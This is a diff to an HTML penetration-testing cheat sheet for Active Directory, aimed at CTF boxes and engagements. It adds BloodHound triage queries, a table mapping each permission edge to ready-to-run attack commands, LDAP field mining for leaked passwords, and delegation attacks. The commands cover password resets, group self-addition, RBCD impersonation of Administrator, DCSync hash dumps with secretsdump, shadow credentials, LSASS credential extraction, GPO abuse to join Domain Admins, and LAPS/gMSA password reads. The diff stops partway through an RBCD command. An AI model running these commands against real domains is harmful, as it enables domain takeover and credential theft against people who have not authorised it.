@@ -440,6 +440,7 @@
       <ul>
         <li><a href="#bloodhound">BloodHound</a></li>
         <li><a href="#auth-enum">Enumeration</a></li>
+        <li><a href="#ldap-mining">🔍 LDAP Attr Mining</a></li>
         <li><a href="#sysvol">SYSVOL / GPP</a></li>
         <li><a href="#encoded">🔓 Encoded Creds</a></li>
         <li><a href="#kerberoast">Kerberoasting</a></li>
@@ -1423,6 +1424,37 @@ Get-ObjectAcl -SamAccountName $USER -ResolveGUIDs  <span class="c"># ACLs on a u
 <div class="sec-body">
 <div class="note n-good">BloodHound is your kill chain map. Run it the moment you have any valid creds. Everything else runs in parallel while it ingests. Stick with <strong>BloodHound CE</strong> (the Kali default) — UI changes but Cypher queries are stable.</div>
 
+<div class="note n-warn" style="margin-top:1rem;"><strong>⚡ CE-specific Cypher limitations:</strong> CE is READ-ONLY in the Cypher tab. These keywords are BLOCKED: <code>SET</code>, <code>DELETE</code>, <code>DETACH DELETE</code>, <code>CREATE</code>, <code>MERGE</code>, <code>REMOVE</code>. To mark nodes as Owned: use UI right-click → "Mark User as Owned" (works in CE). To clear data between engagements: Administration → Database Management → Clear Database. All MATCH/RETURN/WHERE/WITH queries below work fine.</div>
+
+<div class="note n-warn"><strong>⚡ Cypher placeholders need manual substitution:</strong> Queries below use <code>$USER@$REALM</code> etc. as placeholders. CE Cypher does NOT expand bash variables — replace them with literal UPPERCASE strings before pasting. Example: <code>"$USER@$REALM"</code> → <code>"LDAP@SUPPORT.HTB"</code>. Always run <code>MATCH (d:Domain) RETURN d.name</code> first to confirm exact realm format BloodHound stored.</div>
+
+<h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">⚡ Triage — Rich graph or thin graph?</h3>
+<div class="note n-bad"><strong>BloodHound isn't always the path.</strong> If your initial cred is a read-restricted service account (LDAP-only, read-only API), BH will return thin data and look like a dead end. Run these 3 triage queries IMMEDIATELY after ingest to know if you should trust BH or pivot to content enum.</div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">3 triage queries — run right after ingest</span><div class="cb-tags"><span class="tag t-crit">30-second check</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Tells you if BloodHound has enough data to be useful, or if you have a restricted-account scenario where BH is misleading.</div>
+<pre><span class="c">// 1. Object count by type — sanity check on collection</span>
+MATCH (n) RETURN labels(n)[0] AS type, count(*) AS count ORDER BY count DESC
+
+<span class="c">// 2. What does YOUR user have outbound edges to?</span>
+MATCH (u:User {name:"YOUR_USER@REALM"})-[r]-&gt;(n)
+RETURN u.name, type(r), labels(n)[0], n.name
+
+<span class="c">// 3. Are Domain Admins members visible at all?</span>
+MATCH (u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@REALM"})
+RETURN u.name</pre></div>
+
+<table class="qref-table">
+<thead><tr><th style="width:30%">Triage result</th><th style="width:30%">What it means</th><th style="width:40%">What to do</th></tr></thead>
+<tbody>
+<tr><td>✅ Rich: 100+ users, query 2 returns edges, query 3 returns DA members</td><td>Your cred has full read visibility</td><td>BloodHound IS the map. Drive from path queries. Run the full Cypher library.</td></tr>
+<tr><td>⚠️ Thin: 0 outbound edges from your user, DA group empty, low total counts</td><td>You have a read-restricted service account</td><td><strong>STOP poking BH.</strong> Pivot to LDAP attribute mining (<code>info</code> field), share content enum, SYSVOL deep search. BH is confirmation-only at this point — not the path.</td></tr>
+<tr><td>🟡 Mixed: some data but path-to-DA empty</td><td>Standard user with partial visibility</td><td>Try AS-REP roast + Kerberoast unfiltered, password spray, SYSVOL — these don't require ACL paths. Then re-ingest BH after each new cred.</td></tr>
+</tbody>
+</table>
+
+<div class="note n-info"><strong>Why this matters:</strong> The methodology default of "BloodHound first" assumes your cred has decent read access. For service accounts (LDAP API users, helpdesk-restricted accounts, read-only audit users) — common in real engagements and CTFs like HTB Support — BH returns thin data and you waste 30 minutes poking the graph. Triage in 30 seconds, then commit to the right path.</div>
+
 <h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">📦 1. Ingest with bloodhound-python</h3>
 <div class="cb"><div class="cb-head"><span class="cb-lbl">canonical ingest command</span><div class="cb-tags"><span class="tag t-crit">most reliable</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> Collects all AD data using your creds. <code>-dc</code> needs FQDN (NOT IP). <code>-ns</code> tells it which DNS server to use for resolving other domain hosts during collection.</div>
@@ -1686,35 +1718,142 @@ WHERE u.domain &lt;&gt; g.domain AND g.highvalue = true RETURN p</pre></div>
 • <strong>"No path" doesn't mean impossible</strong> — BH only sees AD relationships. SMB share content / SYSVOL / file-stored creds are invisible to it.<br>
 • <strong>"Mark as Owned" right-click fails</strong> — use Cypher: <code>MATCH (u:User {name:"..."}) SET u.owned=true RETURN u</code></div>
 
-<h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🎯 6. Signal → Action Mapping</h3>
+<h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🎯 6. Signal → Action Mapping (complete lookup)</h3>
+<div class="note n-info">This table maps every common BloodHound edge to its exploit chain. Read the edge in BH, find the row here, execute. No deep thought required.</div>
+
 <div class="sig">
-<span class="sig-title">what you see → what you do</span>
+<span class="sig-title">USER object edges</span>
 <div class="sig-entry">
-<span class="sig-signal"><span class="sig-label">Signal:</span> Your user has GenericAll over another user</span>
+<span class="sig-signal"><span class="sig-label">Signal:</span> GenericAll on a User object</span>
 <span class="sig-cmd">net rpc password $TARGETUSER 'NewP@ss123!' -U "$DOMAIN/$USER%$PASS" -S $DC_IP <span class="sig-note">-- reset their password</span></span>
 <span class="sig-cmd">nxc smb $DC_IP -u $TARGETUSER -p 'NewP@ss123!' <span class="sig-note">-- validate</span></span>
 </div>
 <div class="sig-entry">
-<span class="sig-signal"><span class="sig-label">Signal:</span> GenericAll on a Group (e.g. IT Admins)</span>
+<span class="sig-signal"><span class="sig-label">Signal:</span> ForceChangePassword on User</span>
+<span class="sig-cmd">net rpc password $TARGETUSER 'NewP@ss123!' -U "$DOMAIN/$USER%$PASS" -S $DC_IP <span class="sig-note">-- same as GenericAll → reset password</span></span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> AllExtendedRights on User</span>
+<span class="sig-cmd">net rpc password $TARGETUSER 'NewP@ss123!' -U "$DOMAIN/$USER%$PASS" -S $DC_IP <span class="sig-note">-- includes ForceChangePassword right</span></span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> GenericWrite on User</span>
+<span class="sig-cmd">targetedKerberoast.py -u $USER -p "$PASS" -d $DOMAIN <span class="sig-note">-- targeted Kerberoast: write SPN → roast → crack → cleanup</span></span>
+<span class="sig-note">-- Or shadow credentials: certipy shadow auto -u $USER -p "$PASS" -account $TARGETUSER</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> AddKeyCredentialLink on User</span>
+<span class="sig-cmd">certipy shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGETUSER" -dc-ip $DC_IP <span class="sig-note">-- shadow credentials attack → get NT hash without resetting password</span></span>
+</div>
+</div>
+
+<div class="sig">
+<span class="sig-title">GROUP object edges</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> GenericAll / GenericWrite / WriteDACL on a Group</span>
 <span class="sig-cmd">net rpc group addmem "$GROUP" $USER -U "$DOMAIN/$USER%$PASS" -S $DC_IP <span class="sig-note">-- add yourself</span></span>
+<span class="sig-cmd">net rpc group members "$GROUP" -U "$DOMAIN/$USER%$PASS" -S $DC_IP <span class="sig-note">-- verify</span></span>
 </div>
 <div class="sig-entry">
-<span class="sig-signal"><span class="sig-label">Signal:</span> WriteDACL over domain object</span>
-<span class="sig-cmd">Add-DomainObjectAcl -TargetIdentity "$DOMAIN" -PrincipalIdentity $USER -Rights DCSync <span class="sig-note">-- grant yourself DCSync (PowerView)</span></span>
-<span class="sig-cmd">impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -just-dc-ntlm <span class="sig-note">-- full domain dump</span></span>
+<span class="sig-signal"><span class="sig-label">Signal:</span> AddMember / AddSelf on a Group</span>
+<span class="sig-cmd">net rpc group addmem "$GROUP" $USER -U "$DOMAIN/$USER%$PASS" -S $DC_IP <span class="sig-note">-- same as GenericAll for groups</span></span>
+</div>
+</div>
+
+<div class="sig">
+<span class="sig-title">COMPUTER object edges — RBCD territory</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> ⭐ GenericAll / GenericWrite / WriteDACL / WriteOwner on a Computer</span>
+<span class="sig-cmd">→ <strong>RBCD attack — see Delegation section.</strong> Works without shell on target.</span>
+<span class="sig-cmd">impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'FAKE$' -computer-pass 'Fake123!' -dc-ip $DC_IP</span>
+<span class="sig-cmd">impacket-rbcd "$DOMAIN/$USER:$PASS" -delegate-from 'FAKE$' -delegate-to '$TARGET_SHORT$' -action write -dc-ip $DC_IP</span>
+<span class="sig-cmd">impacket-getST "$DOMAIN/FAKE\$:Fake123!" -spn cifs/$TARGET_FQDN -impersonate Administrator -dc-ip $DC_IP</span>
+<span class="sig-cmd">export KRB5CCNAME=$(pwd)/Administrator@CIFS_$TARGET_FQDN@$REALM.ccache</span>
+<span class="sig-cmd">impacket-psexec -k -no-pass $TARGET_FQDN</span>
 </div>
 <div class="sig-entry">
-<span class="sig-signal"><span class="sig-label">Signal:</span> USER node with GetChanges + GetChangesAll → Domain</span>
-<span class="sig-cmd">impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -just-dc-ntlm <span class="sig-note">-- DCSync as that user</span></span>
+<span class="sig-signal"><span class="sig-label">Signal:</span> AddAllowedToAct on a Computer</span>
+<span class="sig-cmd">→ Same chain as above. AddAllowedToAct = the specific right RBCD needs.</span>
 </div>
 <div class="sig-entry">
-<span class="sig-signal"><span class="sig-label">Signal:</span> Unconstrained delegation host (not a DC)</span>
-<span class="sig-cmd">impacket-psexec "$DOMAIN/$LOCALADMIN:$PASS"@$COMPUTER <span class="sig-note">-- shell on that machine</span></span>
-<span class="sig-note">-- Once on it, any DA authenticating to it leaves TGT in memory. Coerce + Rubeus monitor.</span>
+<span class="sig-signal"><span class="sig-label">Signal:</span> Unconstrained delegation host (NOT a DC)</span>
+<span class="sig-cmd">→ Requires local admin shell on that machine. If you already have shell:</span>
+<span class="sig-cmd">.\Rubeus.exe monitor /interval:5 /nowrap <span class="sig-note">-- wait for DA TGT or coerce DC</span></span>
+<span class="sig-cmd">python3 printerbug.py $DOMAIN/$USER:"$PASS"@$DC_IP $UNCON_IP <span class="sig-note">-- force DC to authenticate</span></span>
+<span class="sig-note">⚠️ DCs are ALWAYS unconstrained by default — that's not a finding. Only NON-DC unconstrained hosts are real misconfigs.</span>
 </div>
 <div class="sig-entry">
-<span class="sig-signal"><span class="sig-label">Signal:</span> No path to DA from anyone</span>
-<span class="sig-note">-- BH only sees AD relationships. Switch to: SMB share enum, SYSVOL grep, Kerberoast unfiltered, password reuse spray, ADCS attack surface.</span>
+<span class="sig-signal"><span class="sig-label">Signal:</span> AdminTo edge from your user to Computer</span>
+<span class="sig-cmd">impacket-psexec "$DOMAIN/$USER:$PASS"@$COMPUTER <span class="sig-note">-- direct shell</span></span>
+<span class="sig-cmd">impacket-wmiexec "$DOMAIN/$USER:$PASS"@$COMPUTER <span class="sig-note">-- stealthier</span></span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> CanRDP / CanPSRemote</span>
+<span class="sig-cmd">xfreerdp /u:$USER /p:"$PASS" /d:$DOMAIN /v:$COMPUTER <span class="sig-note">-- RDP</span></span>
+<span class="sig-cmd">evil-winrm -i $COMPUTER -u $USER -p "$PASS" <span class="sig-note">-- PSRemote/WinRM</span></span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> HasSession (from high-value user)</span>
+<span class="sig-cmd">→ Shell the box (via AdminTo or other path), then dump LSASS or steal token from the HV session.</span>
+<span class="sig-cmd">pypykatz live lsa <span class="sig-note">-- after getting SYSTEM, extract creds from memory</span></span>
+</div>
+</div>
+
+<div class="sig">
+<span class="sig-title">DOMAIN object edges</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> WriteDACL on the Domain object</span>
+<span class="sig-cmd">Add-DomainObjectAcl -TargetIdentity "$DOMAIN" -PrincipalIdentity $USER -Rights DCSync <span class="sig-note">-- grant yourself DCSync</span></span>
+<span class="sig-cmd">impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -just-dc-ntlm <span class="sig-note">-- DCSync all hashes</span></span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> ⭐ USER node with GetChanges + GetChangesAll → Domain</span>
+<span class="sig-cmd">impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -just-dc-ntlm <span class="sig-note">-- DCSync as that user — instant DA</span></span>
+<span class="sig-note">⭐ Flag for USER nodes (not Groups) — that's the anomaly. Default DCSync holders are Groups (Admins, Domain Controllers). A User with DCSync = privesc waiting.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> CoerceToTGT edge at end of path</span>
+<span class="sig-note">BH 4.3+ auto-detected the final step can convert to TGT via coercion (PetitPotam, PrinterBug, ADCS ESC8, RBCD). The chain IS exploitable end-to-end. Execute the abuse(s) leading up to it.</span>
+</div>
+</div>
+
+<div class="sig">
+<span class="sig-title">LAPS / gMSA</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> ReadLAPSPassword on Computer</span>
+<span class="sig-cmd">nxc ldap $DC_IP -u $USER -p "$PASS" -M laps <span class="sig-note">-- bulk extract</span></span>
+<span class="sig-cmd">ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" -b "$(echo DC=$DOMAIN | sed 's/\./,DC=/g')" "(&amp;(objectClass=computer)(ms-Mcs-AdmPwd=*))" sAMAccountName ms-Mcs-AdmPwd</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> ReadGMSAPassword on Group/Account</span>
+<span class="sig-cmd">nxc ldap $DC_IP -u $USER -p "$PASS" --gmsa <span class="sig-note">-- bulk read</span></span>
+<span class="sig-cmd">python3 gMSADumper.py -u $USER -p "$PASS" -d $DOMAIN <span class="sig-note">-- standalone tool</span></span>
+</div>
+</div>
+
+<div class="sig">
+<span class="sig-title">GPO / OU edges</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> GenericAll / GenericWrite on a GPO</span>
+<span class="sig-cmd">pyGPOAbuse.py -u $USER -p "$PASS" -d $DOMAIN -dc-ip $DC_IP --gpo-id "{$GPO_GUID}" -f "Domain Admins" <span class="sig-note">-- inject scheduled task that adds $USER to Domain Admins</span></span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> GPLink edge to a GPO you control</span>
+<span class="sig-cmd">→ Same as above — modify GPO content, wait for clients/computers to apply policy.</span>
+</div>
+</div>
+
+<div class="sig">
+<span class="sig-title">When NOTHING works</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Signal:</span> No useful edges from any owned principal</span>
+<span class="sig-note">BH only sees AD relationships. Path is through CONTENT, not ACLs. Switch to:</span>
+<span class="sig-cmd">1. LDAP info/description/comment grep — see "LDAP Attribute Mining" section</span>
+<span class="sig-cmd">2. SMB share content recursion — mget * + grep -rE "pass|cred"</span>
+<span class="sig-cmd">3. SYSVOL deep grep — base64 / cpassword / plaintext</span>
+<span class="sig-cmd">4. Kerberoast / AS-REP unfiltered — try regardless of BH</span>
+<span class="sig-cmd">5. Password reuse spray — try current $PASS against all users</span>
+<span class="sig-cmd">6. RID cycling — find users BH didn't see</span>
 </div>
 </div>
 
@@ -1943,6 +2082,110 @@ nxc smb $DC_IP -u Administrator -p 'Password123!'</pre></div>
       </div>
 </div>
 </details>
+<details class="sec-detail" id="ldap-mining">
+<summary>🔍 LDAP Attribute Mining — Find Creds in Non-Default Fields<span class="order-tag tag-ref" style="margin-right:1rem;">REFERENCE</span></summary>
+<div class="sec-body">
+<div class="note n-good">Default tools (<code>nxc --users</code>, <code>GetADUsers</code>, BloodHound) fetch a SMALL subset of LDAP attributes. Real cred leaks hide in attributes you have to ask for by name. This is the path on every read-restricted-account scenario.</div>
+
+<h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">The fields admins use to leak creds</h3>
+<table class="qref-table">
+<thead><tr><th style="width:25%">Attribute</th><th style="width:35%">What it is</th><th style="width:40%">Why creds end up there</th></tr></thead>
+<tbody>
+<tr><td><code>description</code></td><td>Short user description, shown in ADUC main view</td><td>Admins set "Default pwd: X" thinking they'll come back to clean it. Often the first place to check.</td></tr>
+<tr><td><code>info</code></td><td>⭐ "Notes" tab in ADUC (hidden under Telephones)</td><td>Most common cred leak field — admins think it's hidden. Default LDAP tools DON'T fetch this by default.</td></tr>
+<tr><td><code>comment</code></td><td>Rarely-used free text field</td><td>Sometimes set programmatically by provisioning scripts.</td></tr>
+<tr><td><code>postOfficeBox</code></td><td>Mail address field, rarely populated</td><td>Free text, sometimes abused as scratch space.</td></tr>
+<tr><td><code>street</code> / <code>streetAddress</code></td><td>Physical address fields</td><td>Free text, abused.</td></tr>
+<tr><td><code>userPassword</code></td><td>⚠️ Legacy field from pre-2003</td><td>Some apps wrote plaintext here, often never cleaned up.</td></tr>
+<tr><td><code>scriptPath</code></td><td>Path to logon script</td><td>Path may reveal share locations; script contents may have creds.</td></tr>
+<tr><td><code>homeDirectory</code></td><td>Path to user's home folder</td><td>Same — points to shares that may contain configs/creds.</td></tr>
+</tbody>
+</table>
+
+<h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">All-attributes dump + targeted grep</h3>
+<div class="cb"><div class="cb-head"><span class="cb-lbl">dump everything, grep cred-leak fields</span><div class="cb-tags"><span class="tag t-crit">essential</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Asks LDAP for EVERY attribute on every user object (the <code>'*'</code> attribute), then greps for known credential-leak field names. The <code>info</code> field is the #1 hit on read-restricted boxes.</div>
+<pre><span class="c"># Full attribute dump — every user, every field:</span>
+ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
+  -b "$(echo DC=$DOMAIN | sed 's/\./,DC=/g')" \
+  "(&amp;(objectClass=user)(!(objectClass=computer)))" '*' \
+  2&gt;/dev/null | tee enum/ldap-allattrs.txt
+
+<span class="c"># Targeted grep — just the cred-leak fields, exclude empty values:</span>
+grep -iE '^(info|description|comment|postOfficeBox|userPassword|scriptPath|homeDirectory):' \
+  enum/ldap-allattrs.txt | grep -v ':$'
+
+<span class="c"># Pair username + field together using awk (cleaner output):</span>
+awk '
+  /^sAMAccountName:/ {user=$2}
+  /^(info|description|comment|postOfficeBox|userPassword):/ {
+    val=$0; sub(/^[a-zA-Z]+: /, "", val)
+    if (val != "") print user " | " $1 " " val
+  }
+' enum/ldap-allattrs.txt | sort -u
+
+<span class="c"># Universal "find any password-looking text in any field":</span>
+grep -iE "password|pwd|cred|secret|key|token" enum/ldap-allattrs.txt | grep -v ":$" | head -20</pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">targeted fetch — request specific attributes</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> If you don't want the full dump, ask explicitly for cred-leak fields. Faster and cleaner output. Use this when ldap-allattrs.txt would be huge (10,000+ users).</div>
+<pre><span class="c"># Just the cred-leak attributes (much smaller output):</span>
+ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
+  -b "$(echo DC=$DOMAIN | sed 's/\./,DC=/g')" \
+  "(&amp;(objectClass=user)(!(objectClass=computer)))" \
+  sAMAccountName info description comment postOfficeBox userPassword \
+  2&gt;/dev/null | grep -v "^$" | grep -v "^#"
+
+<span class="c"># Find users where info is NOT empty (LDAP filter):</span>
+ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
+  -b "$(echo DC=$DOMAIN | sed 's/\./,DC=/g')" \
+  "(&amp;(objectClass=user)(info=*))" \
+  sAMAccountName info 2&gt;/dev/null
+
+<span class="c"># Find users where description matches password-like pattern:</span>
+ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
+  -b "$(echo DC=$DOMAIN | sed 's/\./,DC=/g')" \
+  "(&amp;(objectClass=user)(description=*password*))" \
+  sAMAccountName description 2&gt;/dev/null</pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">if you found creds — find which user they belong to</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Reverse search — you have a leaked password, find the user account it goes with.</div>
+<pre><span class="c"># Search backward from the dump file:</span>
+grep -B 30 "FOUND_PASSWORD_STRING" enum/ldap-allattrs.txt | grep -iE "sAMAccountName|dn:"
+
+<span class="c"># Or directly query LDAP for objects containing the string:</span>
+ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
+  -b "$(echo DC=$DOMAIN | sed 's/\./,DC=/g')" \
+  "(|(info=*FOUND_PASSWORD*)(description=*FOUND_PASSWORD*))" \
+  sAMAccountName 2&gt;/dev/null
+
+<span class="c"># Then immediately validate:</span>
+nxc smb $DC_IP -u FOUND_USER -p 'FOUND_PASSWORD'</pre></div>
+
+<div class="sig">
+<span class="sig-title">when to run this</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Trigger:</span> BloodHound triage returned "thin" (read-restricted account)</span>
+<span class="sig-note">This IS the path. Lazy admins use info/description on locked-down boxes because they assume nobody reads those fields. Always check.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Trigger:</span> standard nxc/rpc enumeration found nothing in description</span>
+<span class="sig-note">Default tools only fetch description (sometimes). The 'info' field is invisible to nxc/GetADUsers — only ldapsearch with explicit attribute names finds it.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Trigger:</span> any service account / API user that has LDAP read</span>
+<span class="sig-note">If your cred can read LDAP at all, mine the attributes. It's free intel and frequently the win condition.</span>
+</div>
+</div>
+<div class="moveon">
+<span class="moveon-title">move on when</span>
+<span class="moveon-item">You've grep'd info / description / comment / userPassword across enum/ldap-allattrs.txt</span>
+<span class="moveon-item">Found a password → validate immediately with nxc → re-ingest BloodHound as new user</span>
+<span class="moveon-item">Nothing found → try SYSVOL deep grep next (some boxes hide creds in scripts/configs)</span>
+</div>
+</div>
+</details>
+
 <details class="sec-detail" id="encoded">
 <summary>🔓 Encoded Credentials — Recognize &amp; Decode<span class="order-tag tag-ref" style="margin-right:1rem;">REFERENCE</span></summary>
 <div class="sec-body">
@@ -2288,133 +2531,221 @@ impacket-psexec -k -no-pass dc01.corp.local
 <details class="sec-detail" id="delegation">
 <summary>⚡ Delegation Attacks<span class="tag t-crit" style="margin-left:auto;margin-right:1rem;">instant DA</span></summary>
 <div class="sec-body">
-<div class="note n-info">Delegation lets a machine or service impersonate users to access other services — it's how web servers query databases on your behalf. Three types, each with a different attack. BloodHound finds all of them.</div>
+<div class="note n-info">Delegation lets a machine or service impersonate users to access other services — it's how web servers query databases on your behalf. Three types, each with a different attack and different prerequisites.</div>
 
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">find all delegation — run first</span><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre><span class="c"># From kali — shows all three types at once:</span>
+<h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🎯 Which Delegation Attack? Read the signal, pick the attack.</h3>
+<div class="note n-warn"><strong>Read this BEFORE running any delegation tool.</strong> The wrong attack wastes 30 minutes. The methodology used to teach all three attacks without explaining when to use each — that was a gap. Here's the decision tree.</div>
+
+<table class="qref-table">
+<thead><tr><th style="width:45%">SIGNAL (what you see)</th><th style="width:55%">ATTACK to use</th></tr></thead>
+<tbody>
+<tr><td><strong>BloodHound:</strong> User/Group has <code>GenericAll</code> OR <code>GenericWrite</code> OR <code>WriteDACL</code> OR <code>WriteOwner</code> OR <code>AddAllowedToAct</code> on a Computer node<br><br>You see this = you do RBCD. <br>No shell on target needed. Works entirely from Kali.</td><td>⭐ <strong>RBCD (Type 3)</strong> — the most common path. Jump to the RBCD subsection below.</td></tr>
+<tr><td><strong>findDelegation:</strong> Computer flagged "Unconstrained" — AND that computer is NOT a Domain Controller — AND you have local admin shell ON that exact machine</td><td><strong>Unconstrained (Type 1)</strong> — Rubeus monitor + coerce DA.<br>Shell required. No shortcut.</td></tr>
+<tr><td><strong>findDelegation:</strong> User/Computer has <code>msDS-AllowedToDelegateTo</code> set — AND you own that principal's creds/hash</td><td><strong>Constrained (Type 2)</strong> — S4U2Self + S4U2Proxy chain. You control the SOURCE principal.</td></tr>
+</tbody>
+</table>
+
+<div class="note n-bad"><strong>🐛 findDelegation false-positive: DCs ALWAYS show as Unconstrained.</strong> Every Domain Controller is configured for unconstrained delegation by default — it's how Kerberos works internally. Seeing <code>DC$</code> as "Unconstrained" in <code>findDelegation</code> output is NOT a finding, just noise. Filter it out mentally. What IS a finding: a MEMBER SERVER (not DC) flagged unconstrained, or any account with <code>msDS-AllowedToDelegateTo</code> set.</div>
+
+<div class="note n-info"><strong>Decision priority:</strong> If you have BOTH a BH edge AND findDelegation result for the same target, ALWAYS prefer RBCD via the BH edge. RBCD works from Kali with no shell. Unconstrained requires you to first get shell on the machine — which often requires the very privilege you're trying to escalate to.</div>
+
+<h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🔎 Step 1 — Find all delegation in the domain</h3>
+<div class="cb"><div class="cb-head"><span class="cb-lbl">enumerate delegation — shows all three types</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Lists every account/machine with delegation configured. Pair with BloodHound's ACL graph to determine which attack you can actually execute.</div>
+<pre><span class="c"># All delegation types at once:</span>
 impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
 
-<span class="c"># BloodHound — unconstrained:</span>
-MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
+<span class="c"># Unconstrained — BloodHound (excludes DCs which are default-true):</span>
+MATCH (c:Computer {unconstraineddelegation:true})
+WHERE NOT (c)-[:MemberOf]->(:Group {name:"DOMAIN CONTROLLERS@$REALM"})
+RETURN c.name
 
-<span class="c"># BloodHound — constrained (AllowedToDelegate edge):</span>
-MATCH p=(u)-[:AllowedToDelegate]-&gt;(c) RETURN u.name,c.name
+<span class="c"># Constrained — BloodHound (AllowedToDelegate edge):</span>
+MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN u.name, c.name
 
-<span class="c"># BloodHound — RBCD (GenericWrite on computer object):</span>
-MATCH p=(u)-[:GenericWrite]-&gt;(c:Computer) RETURN p</pre></div>
+<span class="c"># RBCD-able — BloodHound (write access on a Computer object):</span>
+MATCH p=(u)-[:GenericAll|GenericWrite|WriteDACL|WriteOwner|AddAllowedToAct]->(c:Computer)
+RETURN p</pre></div>
 
-      <div class="cb"><div class="cb-head"><span class="cb-lbl">type 1 — unconstrained delegation</span><div class="cb-tags"><span class="tag t-crit">most dangerous</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
-        <pre><span class="c"># WHAT IT IS:</span>
-<span class="c"># Machine stores ANY user's full TGT when they authenticate to it</span>
-<span class="c"># Any DA who connects → their TGT lands in LSASS on that machine</span>
-<span class="c"># Get local admin on it → steal DA TGT → own domain</span>
-<span class="c">#</span>
-<span class="c"># FIND IT:</span>
-impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
-<span class="c"># Look for: "Unconstrained" in the Delegation Type column</span>
-Get-DomainComputer -Unconstrained | select name   <span class="c"># PowerView</span>
+<h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">⭐ Type 3 — RBCD (Resource-Based Constrained Delegation)</h3>
+<div class="cb"><div class="cb-head"><span class="cb-lbl">USE WHEN: GenericAll/Write/WriteDACL on a Computer object</span><div class="cb-tags"><span class="tag t-crit">most common path</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Add a fake computer account → write the RBCD ACE on the target so the fake computer can act on behalf of others → request a service ticket impersonating Administrator → use the ticket. Works entirely from Kali, no shell required.</div>
+<pre><span class="c"># PREREQS — verify before starting:</span>
+<span class="c">#   ☑ BloodHound shows your user/group has write access on a Computer node</span>
+<span class="c">#   ☑ Machine Account Quota > 0 (default 10) — check: nxc ldap $DC_IP -u $USER -p "$PASS" -M maq</span>
+<span class="c">#   ☑ Clock synced to DC — sudo ntpdate $DC_IP</span>
+<span class="c">#   ☑ Target FQDN in /etc/hosts — dc-host $DC_IP $DC_HOST</span>
 
-<span class="c"># EXPLOIT — Option A: wait for DA to naturally authenticate:</span>
+<span class="c"># Set target vars (replace with real values):</span>
+export TARGET_COMP='DC'                          <span class="c"># SHORT sAMAccountName, no domain</span>
+export TARGET_FQDN="dc.${DOMAIN}"                <span class="c"># lowercase FQDN</span>
+
+<span class="c"># Step 1 — Create a fake computer account (every domain user can add up to 10):</span>
+impacket-addcomputer "$DOMAIN/$USER:$PASS" \
